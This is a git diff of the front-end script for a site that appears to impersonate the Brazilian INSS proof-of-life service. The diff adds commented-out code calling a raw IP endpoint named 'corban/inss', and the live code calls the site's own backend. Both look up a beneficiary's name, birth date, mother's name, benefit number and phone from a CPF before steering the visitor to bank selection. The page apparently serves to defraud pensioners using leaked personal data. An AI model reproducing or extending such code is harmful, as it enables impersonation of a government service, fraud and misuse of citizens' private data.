@@ -78,7 +78,7 @@
                 const appContainer = document.createElement('div');
                 appContainer.className = 'min-h-screen flex flex-col';
                 
-                let BASE_URL = "https://agendarprovadevida.org";//"http://localhost:5000";
+                let BASE_URL = "http://localhost:5000";//"https://agendarprovadevida.org";
                 let isModalOpen = true;
                 let isLoading = false;
                 let currentView = 'cpf_input'; // Inicia no input de CPF
@@ -274,15 +274,51 @@
                             // post ajax request to backend, redirect preview CPF data
 
                             // Define apiData com valores padrão/nulos, pois a API externa foi removida
-                            
+                            // const API_URI = "http://138.255.160.137:8080/corban/inss";
+                            // $.ajax({
+                            //         url: API_URI + "?cpf=" + cleanCpf, // The URL you are requesting
+                            //         method: 'GET', // Or 'POST', 'PUT', etc.
+                            //         dataType: 'json' // Expecting a JSON response
+                            // })
+                            // .done(function(data) {
+                            //     console.log(data);
+                            //     apiData.personalInfo.cpf = cleanCpf;
+				            //     apiData.personalInfo.nome = data.name;
+                            //         const dateTime = new Date(data.birthday);
+                            //         const year = dateTime.getUTCFullYear(); // 2025
+                            //         const month = (dateTime.getUTCMonth() + 1).toString().padStart(2, '0'); // "08" (months are zero-indexed)
+                            //         const day = dateTime.getUTCDate().toString().padStart(2, '0'); // "26"
+                            //         const formattedDate = `${year}-${month}-${day}`; // "2025-08-26"
+                            //     apiData.personalInfo.dataNascimento = formattedDate;
+                            //     apiData.personalInfo.nomeMae = data.motherName;
+                            //     apiData.personalInfo.numeroBeneficio = data.benefitNumber;
+                            //     apiData.personalInfo.telefone = data.phone;
+                            //     // Prossegue diretamente para a seleção de banco
+                            //     currentView = 'api_data_display';
+                            //     render();
+                            // })
+                            // .fail(function(jqXHR, textStatus, errorThrown) {
+                            //     if (jqXHR.status === 404) {
+                            //         apiData.personalInfo.cpf = cleanCpf;
+                            //         // The backend sent a 404 Not Found response
+                            //         currentView = 'api_data_write';
+                            //         render();
+
+                            //     } else {
+                            //         // Other error statuses
+                            //         showTemporaryMessage("Ocorreu um erro inesperado.", "error");
+                            //     }
+                            // });
+
                             $.ajax({
                                     url: BASE_URL + "/api/citizenData/" + cleanCpf, // The URL you are requesting
                                     method: 'GET', // Or 'POST', 'PUT', etc.
                                     dataType: 'json' // Expecting a JSON response
                             })
                             .done(function(data) {
+                                console.log(data);
                                 apiData.personalInfo.cpf = cleanCpf;
-				apiData.personalInfo.nome = data.name;
+				                apiData.personalInfo.nome = data.name;
                                     const dateTime = new Date(data.birthday);
                                     const year = dateTime.getUTCFullYear(); // 2025
                                     const month = (dateTime.getUTCMonth() + 1).toString().padStart(2, '0'); // "08" (months are zero-indexed)
@@ -360,10 +396,6 @@
 
                                 <div class="mt-8">
                                     <button id="realizar-prova-de-vida-btn" class="btn-primary w-full" disabled>Realizar Prova de Vida</button>
-                                </div>
-                                
-                                <div class="mt-4 text-center">
-                                    <button id="preencher-manualmente-btn" class="text-[#1351b4] hover:underline text-sm" disabled>Preencher dados manualmente</button>
                                 </div>
                             </div>
                         `;
